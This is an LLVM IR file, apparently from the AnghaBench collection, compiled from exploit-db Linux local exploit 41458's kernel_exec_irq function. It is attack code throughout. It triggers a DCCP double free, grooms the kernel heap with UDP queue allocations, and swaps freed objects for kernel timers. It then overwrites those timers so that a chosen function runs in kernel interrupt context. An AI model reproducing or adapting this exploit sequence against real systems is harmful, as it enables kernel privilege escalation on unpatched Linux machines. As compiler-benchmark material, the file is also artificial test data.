; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41458.c_kernel_exec_irq.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41458.c_kernel_exec_irq.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dccp_handle = type { i32 }
%struct.udp_fifo_handle = type { i32 }

@.str = private unnamed_addr constant [23 x i8] c"[.] scheduling %p(%p)\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"kmalloc pad\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"kmalloc warm\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"dccp init\00", align 1
@port = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [19 x i8] c"dccp kmalloc kfree\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"catch 1\00", align 1
@CATCH_FIRST = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [17 x i8] c"dccp kfree again\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"catch 2\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"catch 1 -> timer\00", align 1
@.str.9 = private unnamed_addr constant [14 x i8] c"catch 1 small\00", align 1
@CATCH_AGAIN_SMALL = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [16 x i8] c"schedule timers\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"catch 2 -> overwrite timers\00", align 1
@.str.12 = private unnamed_addr constant [14 x i8] c"catch 2 small\00", align 1
@.str.13 = private unnamed_addr constant [38 x i8] c"[.] waiting for the timer to execute\0A\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"wait\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"[.] done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @kernel_exec_irq(i8* %0, i64 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.dccp_handle, align 4
  %7 = alloca %struct.udp_fifo_handle, align 4
  %8 = alloca %struct.udp_fifo_handle, align 4
  %9 = alloca %struct.udp_fifo_handle, align 4
  %10 = alloca %struct.udp_fifo_handle, align 4
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  store i8* %0, i8** %3, align 8
  store i64 %1, i64* %4, align 8
  %15 = load i8*, i8** %3, align 8
  %16 = load i64, i64* %4, align 8
  %17 = inttoptr i64 %16 to i8*
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i8* %15, i8* %17)
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %20 = call i32 @memset(i8* %19, i32 195, i32 2048)
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %22 = load i8*, i8** %3, align 8
  %23 = load i64, i64* %4, align 8
  %24 = call i32 @init_timer_buffer(i8* %21, i8* %22, i64 %23)
  %25 = call i32 @udp_fifo_init(%struct.udp_fifo_handle* %7)
  %26 = call i32 @udp_fifo_init(%struct.udp_fifo_handle* %8)
  %27 = call i32 @udp_fifo_init(%struct.udp_fifo_handle* %9)
  %28 = call i32 @udp_fifo_init(%struct.udp_fifo_handle* %10)
  %29 = call i32 @debug(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  %30 = call i32 (...) @kmalloc_pad()
  %31 = call i32 @debug(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %32 = call i32 (...) @kmalloc_warm()
  %33 = call i32 @debug(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %34 = load i32, i32* @port, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* @port, align 4
  %36 = call i32 @dccp_init(%struct.dccp_handle* %6, i32 %34)
  %37 = call i32 @debug(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %38 = call i32 @dccp_kmalloc_kfree(%struct.dccp_handle* %6)
  %39 = call i32 @debug(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %40

40:                                               ; preds = %47, %2
  %41 = load i32, i32* %5, align 4
  %42 = load i32, i32* @CATCH_FIRST, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %50

44:                                               ; preds = %40
  %45 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %46 = call i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle* %7, i8* %45)
  br label %47

47:                                               ; preds = %44
  %48 = load i32, i32* %5, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %5, align 4
  br label %40

50:                                               ; preds = %40
  %51 = call i32 @debug(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0))
  %52 = call i32 @dccp_kfree_again(%struct.dccp_handle* %6)
  %53 = call i32 @debug(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %54

54:                                               ; preds = %61, %50
  %55 = load i32, i32* %5, align 4
  %56 = load i32, i32* @CATCH_FIRST, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %64

58:                                               ; preds = %54
  %59 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %60 = call i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle* %8, i8* %59)
  br label %61

61:                                               ; preds = %58
  %62 = load i32, i32* %5, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %5, align 4
  br label %54

64:                                               ; preds = %54
  %65 = load i32, i32* @CATCH_FIRST, align 4
  %66 = zext i32 %65 to i64
  %67 = call i8* @llvm.stacksave()
  store i8* %67, i8** %13, align 8
  %68 = alloca i32, i64 %66, align 16
  store i64 %66, i64* %14, align 8
  %69 = call i32 @debug(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %70

70:                                               ; preds = %80, %64
  %71 = load i32, i32* %5, align 4
  %72 = load i32, i32* @CATCH_FIRST, align 4
  %73 = icmp slt i32 %71, %72
  br i1 %73, label %74, label %83

74:                                               ; preds = %70
  %75 = call i32 @udp_fifo_kfree(%struct.udp_fifo_handle* %7)
  %76 = call i32 (...) @timer_kmalloc()
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i32, i32* %68, i64 %78
  store i32 %76, i32* %79, align 4
  br label %80

80:                                               ; preds = %74
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %5, align 4
  br label %70

83:                                               ; preds = %70
  %84 = call i32 @debug(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %85

85:                                               ; preds = %91, %83
  %86 = load i32, i32* %5, align 4
  %87 = load i32, i32* @CATCH_AGAIN_SMALL, align 4
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %89, label %94

89:                                               ; preds = %85
  %90 = call i32 @udp_fifo_kmalloc_small(%struct.udp_fifo_handle* %10)
  br label %91

91:                                               ; preds = %89
  %92 = load i32, i32* %5, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %5, align 4
  br label %85

94:                                               ; preds = %85
  %95 = call i32 @debug(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %96

96:                                               ; preds = %106, %94
  %97 = load i32, i32* %5, align 4
  %98 = load i32, i32* @CATCH_FIRST, align 4
  %99 = icmp slt i32 %97, %98
  br i1 %99, label %100, label %109

100:                                              ; preds = %96
  %101 = load i32, i32* %5, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %68, i64 %102
  %104 = load i32, i32* %103, align 4
  %105 = call i32 @timer_schedule(i32 %104, i32 500)
  br label %106

106:                                              ; preds = %100
  %107 = load i32, i32* %5, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %5, align 4
  br label %96

109:                                              ; preds = %96
  %110 = call i32 @debug(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %111

111:                                              ; preds = %119, %109
  %112 = load i32, i32* %5, align 4
  %113 = load i32, i32* @CATCH_FIRST, align 4
  %114 = icmp slt i32 %112, %113
  br i1 %114, label %115, label %122

115:                                              ; preds = %111
  %116 = call i32 @udp_fifo_kfree(%struct.udp_fifo_handle* %8)
  %117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %118 = call i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle* %9, i8* %117)
  br label %119

119:                                              ; preds = %115
  %120 = load i32, i32* %5, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %5, align 4
  br label %111

122:                                              ; preds = %111
  %123 = call i32 @debug(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %124

124:                                              ; preds = %130, %122
  %125 = load i32, i32* %5, align 4
  %126 = load i32, i32* @CATCH_AGAIN_SMALL, align 4
  %127 = icmp slt i32 %125, %126
  br i1 %127, label %128, label %133

128:                                              ; preds = %124
  %129 = call i32 @udp_fifo_kmalloc_small(%struct.udp_fifo_handle* %10)
  br label %130

130:                                              ; preds = %128
  %131 = load i32, i32* %5, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %5, align 4
  br label %124

133:                                              ; preds = %124
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.13, i64 0, i64 0))
  %135 = call i32 @debug(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0))
  %136 = call i32 @sleep(i32 1)
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i64 0, i64 0))
  %138 = load i8*, i8** %13, align 8
  call void @llvm.stackrestore(i8* %138)
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @init_timer_buffer(i8*, i8*, i64) #1

declare dso_local i32 @udp_fifo_init(%struct.udp_fifo_handle*) #1

declare dso_local i32 @debug(i8*) #1

declare dso_local i32 @kmalloc_pad(...) #1

declare dso_local i32 @kmalloc_warm(...) #1

declare dso_local i32 @dccp_init(%struct.dccp_handle*, i32) #1

declare dso_local i32 @dccp_kmalloc_kfree(%struct.dccp_handle*) #1

declare dso_local i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle*, i8*) #1

declare dso_local i32 @dccp_kfree_again(%struct.dccp_handle*) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @udp_fifo_kfree(%struct.udp_fifo_handle*) #1

declare dso_local i32 @timer_kmalloc(...) #1

declare dso_local i32 @udp_fifo_kmalloc_small(%struct.udp_fifo_handle*) #1

declare dso_local i32 @timer_schedule(i32, i32) #1

declare dso_local i32 @sleep(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
